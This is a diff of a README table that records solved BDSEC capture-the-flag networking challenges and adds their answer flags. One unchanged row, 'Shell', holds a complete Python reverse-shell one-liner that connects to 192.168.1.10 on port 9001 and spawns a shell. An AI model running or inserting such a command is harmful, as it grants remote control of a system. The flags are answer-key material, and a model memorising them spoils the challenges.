@@ -54,9 +54,9 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 | Administrator | Networking        | TareqAhamed   | 50     | ✔ | `` |
 | Shell | Networking        | TareqAhamed   | 50     | ✔ | <details><summary>`BDSEC{....`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
 | Secret Key | Networking        | TareqAhamed   | 50     | ✔ | `` |
-| Database Admin | Networking        | TareqAhamed   | 50     | ✔ | `` |
-| HostName | Networking        | TareqAhamed   | 50     | ✔ | `` |
-| CodeName | Networking        | TareqAhamed   | 50     | ✔ | `` |
+| Database Admin | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{root_root}` |
+| HostName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin}` |
+| CodeName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{xenial}` |
 | Server Info | Networking        | TareqAhamed   | 50     | ✔ | `` |
 | Service Exploit | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{polkit}` |
 | Exploit Exploit Exploit | Networking        |  marufmurtuza   | 50     | ✔ | `` |
